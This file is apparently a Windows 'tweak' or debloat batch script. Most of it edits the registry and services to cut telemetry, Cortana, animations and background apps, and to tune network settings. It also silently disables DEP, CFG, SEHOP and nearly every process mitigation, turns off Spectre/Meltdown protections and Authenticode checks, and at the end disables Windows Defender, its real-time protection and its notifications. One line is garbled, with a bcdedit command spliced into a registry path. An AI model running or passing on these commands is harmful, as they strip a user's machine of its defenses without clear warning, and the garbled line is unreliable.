reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.XboxSpeechToTextOverlay_1.17.29001.0_x64__8wekyb3d8bbwe /f
reg delete HKCR\Extensions\ContractId\Windows.Protocol\PackageId\Microsoft.ZuneMusic_10.19071.19011.0_x64__8wekyb3d8bbwe /f
cls
reg add "HKLM\SYSTEM\currentcontrolset\control\session manager\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\currentcontrolset\control\session manager\Memory Management" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\currentcontrolset\control\session manager\kernel" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\currentcontrolset\control\session manager\Executive" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\currentcontrolset\control\session manager" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\ModernSleep" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f >nul 2>&1 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" /v "MaintenanceDisabled" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications" /v "GlobalUserDisabled" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "BackgroundAppGlobalToggle" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control" /v "SvcHostSplitThresholdInKB" /t REG_DWORD /d "%RAM%" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "EnableTransparency" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f >nul 2>&1
reg add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f >nul 2>&1
reg add "HKLM\SYSTEM\ControlSet001\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\ControlSet002\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SYSTEM\ControlSet002\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f >nul 2>&1
reg add "HKLM\SYSTEM\ControlSet002\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f >nul 2>&1
reg add "HKLM\SYSTEM\ControlSet002\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "EnableCfg" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "ProtectionMode" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "MoveImages" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Kernel" /v "DisableExceptionChainValidation" /t REG_DWORD /d "1" /f >nul 2>&1
bcdedit /set nx AlwaysOff >nul 2>&1
Powershell -Command "Set-ProcessMitigation -System -Disable DEP, EmulateAtlThunks, SEHOP, ForceRelocateImages, RequireInfo, BottomUp, HighEntropy, StrictHandle, DisableWin32kSystemCalls, AuditSystemCall, DisableExtensionPoints, BlockDynamicCode, AllowThreadsToOptOut, AuditDynamicCode, CFG, SuppressExports, StrictCFG, MicrosoftSignedOnly, AllowStoreSignedBinaries, AuditMicrosoftSigned, AuditStoreSigned, EnforceModuleDependencySigning, DisableNonSystemFonts, AuditFont, BlockRemoteImageLoads, BlockLowLabelImageLoads, PreferSystem32, AuditRemoteImageLoads, AuditLowLabelImageLoads, AuditPreferSystem32, EnableExportAddressFilter, AuditEnableExportAddressFilter, EnableExportAddressFilterPlus, AuditEnableExportAddressFilterPlus, EnableImportAddressFilter, AuditEnableImportAddressFilter, EnableRopStackPivot, AuditEnableRopStackPivot, EnableRopCallerCheck, AuditEnableRopCallerCheck, EnableRopSimExec, AuditEnableRopSimExec, SEHOP, AuditSEHOP, SEHOPTelemetry, TerminateOnError, DisallowChildProcessCreation, AuditChildProcess" >nul 2>&1
reg add "HKCU\Control Panel\Mouse" /v "MouseSpeed" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Control Panel\Mouse" /v "MouseThreshold1" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Control Panel\Mouse" /v "MouseThreshold2" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKEY_CURRENT_USER\Control Panel\Keyboard" /v "KeyboardDelay" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\services\mouclass\Parameters" /v "MouseDataQueueSize" /t REG_DWORD /d "20" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\services\kbdclass\Parameters" /v "KeyboardDataQueueSize" /t REG_DWORD /d "20" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe\PerfOptions" /v CpuPriorityClass /t Reg_DWORD /d "4" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe\PerfOptions" /v IoPriority /t Reg_DWORD /d "3" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "VisualFXSetting" /t REG_DWORD /d "3" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\AnimateMinMax" /v "DefaultApplied" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ComboBoxAnimation" /v "DefaultApplied" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ControlAnimations" /v "DefaultApplied" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\CursorShadow" /v "DefaultApplied" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DragFullWindows" /v "DefaultApplied" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DropShadow" /v "DefaultApplied" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMAeroPeekEnabled" /v "DefaultApplied" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMSaveThumbnailEnabled" /v "DefaultApplied" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListBoxSmoothScrolling" /v "DefaultApplied" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListviewAlphaSelect" /v "DefaultApplied" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListviewShadow" /v "DefaultApplied" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\MenuAnimation" /v "DefaultApplied" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\SelectionFade" /v "DefaultApplied" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\TaskbarAnimations" /v "DefaultApplied" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ThumbnailsOrIcon" /v "DefaultApplied" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\TooltipAnimation" /v "DefaultApplied" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\TransparentGlass" /v "DefaultApplied" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Control Panel\International\User Profile" /v "HttpAcceptLanguageOptOut" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\PolicyManager\default\WiFi\AllowAutoConnectToWiFiSenseHotspots" /v "value" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\PolicyManager\default\WiFi\AllowWiFiHotSpotReporting" /v "value" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" /v "DownloadMode" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\ImmersiveShell" /v "UseActionCenterExperience" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "HideSCAHealth" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\AdvertisingInfo" /v "DisabledByGroupPolicy" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\EnhancedStorageDevices" /v "TCGSecurityActivationDisabled" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\OneDrive" /v "DisableFileSyncNGSC" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\safer\codeidentifiers" /v "authenticodeenabled" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "HideSCAHealth" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AdvertisingInfo" /v "DisabledByGroupPolicy" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\safer\codeidentifiers" /v "authenticodeenabled" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "DisableInventory" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\Bluetooth" /v "AllowAdvertising" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\ControlSet001\Services\DiagTrack" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKLM\SYSTEM\ControlSet001\Services\dmwappushsvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\dmwappushservice" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\diagnosticshub.standardcollector.service" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /d "0" /t REG_DWORD /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "LimitEnhancedDiagnosticDataWindowsAnalytics" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Policies\Microsoft\Windows\Windows Error Reporting" /v "Disabled" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting" /v "Disabled" /t "REG_DWORD" /d "1" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\Windows Error Reporting" /v "DontSendAdditionalData" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\Windows Error Reporting" /v "LoggingDisabled" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WerSvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wercplsupport" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
schtasks /Change /TN "Microsoft\Windows\ErrorDetails\EnableErrorDetailsUpdate" /Disable >nul 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Error Reporting\QueueReporting" /Disable >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowSearchToUseLocation" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "BingSearchEnabled" /t REG_DWORD /d 0 /f >nul 2>&1
taskkill /f /im Cortana.exe >nul 2>&1
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowCortanaButton" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "CortanaEnabled" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "CortanaEnabled" /t REG_DWORD /d "0" /f >nul 2>&1 
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortana" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Experience\AllowCortana" /v "value" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCloudSearch" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortanaAboveLock" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Speech_OneCore\Preferences" /v "VoiceActivationOn" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Speech_OneCore\Preferences" /v "VoiceActivationDefaultOn" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Speech_OneCore\Preferences" /v "VoiceActivationEnableAboveLockscreen" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "CanCortanaBeEnabled" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "CortanaEnabled" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "SearchboxTaskbarMode" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowSearchToUseLocation" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Speech_OneCore\Settings\OnlineSpeechPrivacy" /v "HasAccepted" /t "REG_DWORD" /d "0" /f >nul 2>&1
reg del "HKCU\SOFTWARE\Microsoft\Siuf\Rules" /v "PeriodInNanoSeconds" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Siuf\Rules" /v "NumberOfSIUFInPeriod" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "DoNotShowFeedbackNotifications" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "DoNotShowFeedbackNotifications" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AxInstSV" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\tzautoupdate" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PimIndexMaintenanceSvc" /v "Start"  /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\dmwappushservice" /v "Start"  /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MapsBroker" /v "Start"  /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lfsvc" /v "Start"  /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess" /v "Start"  /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lltdsvc" /v "Start"  /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AppVClient" /v "Start"  /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CscService" /v "Start"  /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PhoneSvc" /v "Start"  /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Spooler" /v "Start"  /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PrintNotify" /v "Start"  /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\QWAVE" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RemoteAccess" /v "Start"  /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SensorDataService" /v "Start"  /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SensrSvc" /v "Start"  /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SensorService" /v "Start"  /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ShellHWDetection" /v "Start"  /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SSDPSRV" /v "Start"  /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TabletInputService" /v "Start"  /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\upnphost" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UevAgentService" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WalletService" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\stisvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\icssvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SEMgrSvc" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableICMPRedirect" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "32" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "8760" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "8760" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "64" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters" /v "MaxFreeTcbs" /t REG_DWORD /d "65536" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters" /v "EnableWsd" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\services\Tcpip\Parameters" /v "TCPCongestionControl" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\System\CurrentControlSet\Services\AFD\Parameters" /v "DoNotHoldNicBuffers" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\System\CurrentControlSet\Services\AFD\Parameters" /v "DisableRawSecurity" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\System\CurrentControlSet\Services\AFD\Parameters" /v "DisableAddressSharing" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\System\CurrentControlSet\Services\AFD\Parameters" /v "DisableChainedReceive" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "Class" /t REG_DWORD /d "8" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvbcdedit /set tscsyncpolicy legacyider" /v "DnsPriority" /t REG_DWORD /d "2000" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "HostsPriority" /t REG_DWORD /d "500" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d "499" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "NetbtPriority" /t REG_DWORD /d "2001" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\QoS" /v "Do not use NLA" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Winsock" /v "UseDelayedAcceptance" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v "TimerResolution" /t REG_DWORD /d "1" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\services\NDIS\Parameters" /v "TrackNblOwner" /t REG_DWORD /d "0" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\services\NDIS\Parameters" /v "DisableNDISWatchDog" /t REG_DWORD /d "1" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Sense" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\wscsvc" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d "1" /f
